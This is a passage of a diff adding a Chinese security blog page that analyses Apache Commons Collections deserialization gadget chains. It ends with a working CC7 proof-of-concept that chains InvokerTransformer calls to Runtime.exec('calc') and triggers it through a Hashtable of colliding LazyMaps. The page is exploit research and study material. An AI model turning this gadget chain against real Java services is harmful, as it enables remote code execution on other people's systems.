+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new String[]{&quot;calc&quot;}),
+        };
+        Map hashMap1 = new HashMap();
+        Map hashMap2 = new HashMap();
+        Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);
+        lazyMap1.put(&quot;yy&quot;, 1);
+        Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 1);
+        lazyMap2.remove(&quot;yy&quot;);
+        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(transformerChain, transformers);
+        serialize(hashtable);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws Exception{
+        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        return o;
+    }
+}
+</code></pre>
+<p>至此cc链系列就结束了，从开始分析CC1到现在也花了十几天，踩了很多坑，问了不少师傅，但是收获也不错</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#commons-collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">commons-collections2反序列化链分析</a>
+<ul>
+<li><a href="#%E6%95%B4%E4%BD%93%E5%88%86%E6%9E%90">整体分析</a></li>
+<li><a href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90">细节分析</a></li>
+</ul>
+</li>
+<li><a href="#commons-collections4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">commons-collections4反序列化链分析</a></li>
+<li><a href="#commons-collections5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">commons-collections5反序列化链分析</a></li>
+<li><a href="#commons-collections7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">commons-collections7反序列化链分析</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/commons-collections1-fan-xu-lie-hua-lian/">
+              <h3 class="post-title">
+                commons-collections1反序列化链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
